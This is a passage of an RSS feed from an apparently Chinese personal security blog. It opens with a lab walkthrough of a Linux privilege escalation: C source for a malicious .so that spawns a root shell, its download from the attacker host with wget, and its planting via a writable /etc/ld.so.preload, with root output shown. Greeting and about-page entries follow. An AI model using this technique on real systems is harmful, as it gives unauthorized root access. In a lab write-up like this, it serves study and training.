🔗https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html

在kali创建一个恶意so

```
┌──(kali㉿kali)-[~/test]
└─$ cat exp.c 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;  // 包含 unlink(), setuid(), setgid() 等函数

void _init() {
    // 删除 /etc/ld.so.preload 文件
    unlink('/etc/ld.so.preload');

    // 提升权限，设置为 root 用户和组
    setgid(0);    // 设置为 root 组
    setuid(0);    // 设置为 root 用户

    // 执行 shell（如需要）
    system('/bin/bash');
}
   
┌──(kali㉿kali)-[~/test]
└─$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
                                                     
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.141 - - [03/Feb/2025 17:31:20] 'GET /exp.so HTTP/1.1' 200 -
welcome@listen:/tmp$ wget 192.168.205.128/exp.so
--2025-02-03 04:31:04--  http://192.168.205.128/exp.so
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‘exp.so’

exp.so                                                       0%[                                                                       exp.so                                                     100%[========================================================================================================================================&gt;]  13.82K  --.-KB/s    in 0s    

2025-02-03 04:31:04 (91.0 MB/s) - ‘exp.so’ saved [14152/14152]

welcome@listen:/tmp$ chmod +x exp.so 
welcome@listen:/tmp$ umask 000
welcome@listen:/tmp$ touch /etc/ld.so.preload
welcome@listen:/tmp$ ls -al /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Feb  3 04:31 /etc/ld.so.preload
welcome@listen:/tmp$ echo '/tmp/exp.so' &gt; /etc/ld.so.preload
welcome@listen:/tmp$ touch test
root@listen:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(welcome)
```

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Listen.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>新年快乐！</title><link>https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># 新年快乐！

新的一年，愿你如东风破浪，事业蒸蒸日上，生活美满如意。愿你心想事成，笑容常开，所有的努力都能迎来丰硕的果实。愿新的一年，带给你更多的机会与挑战，让你变得更加坚韧、更加精彩！新春快乐，万事如意！

&lt;!-- ##{'timestamp':1738136321}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Wed, 29 Jan 2025 07:38:41 +0000</pubDate></item><item><title>友链</title><link>https://7r1UMPHK.github.io/link.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umphk.github.io/plugins/FriendLinks.js'&gt;&lt;/script&gt;'}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/link.html</guid><pubDate>Fri, 27 Jun 2025 09:29:38 +0000</pubDate></item><item><title>about</title><link>https://7r1UMPHK.github.io/about.html</link><description>

# 👋 关于我

![GitHub 活跃图](https://ghchart.rshah.org/7r1umphk)

## 🌟 人生轨迹

- 🥇 某省技能大赛 **通信方向一等奖**
- 🎓 某知名大专院校毕业
- 📡 **HCIP-Datacom** 持证
- 📚 正在备考 **HCIE-Datacom**

## 💻 技术栈

- 🐍 Python（入门探索）
- 🖥 Bash（入门实践）
- 📡 Datacom（HCIP 已过，HCIE 备考中）
- ✨ JavaScript（偶尔尝试）

# 📝 关于本站

本站始于 **2025/01/29**，采用 **GitHub Pages + gmeek** 搭建。
 主要记录学习历程与一些个人统计，既是给自己留档，也希望能对他人有点参考价值。

## 💰 运行成本

- **0 元**（完全托管在 GitHub）

## 📅 站点大事记

| 日期       | 改动/事件                                 |
| ---------- | ----------------------------------------- |
| 2023/01/29 | 使用 GitHub Pages 搭建 gmeek 博客         |
| …          | 一系列美化与功能调整                      |
| 2025/06/26 | 因账号丢失，重开于 **7r1umphk.github.io** |

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/about.html</guid><pubDate>Sun, 10 Aug 2025 07:51:10 +0000</pubDate></item></channel></rss>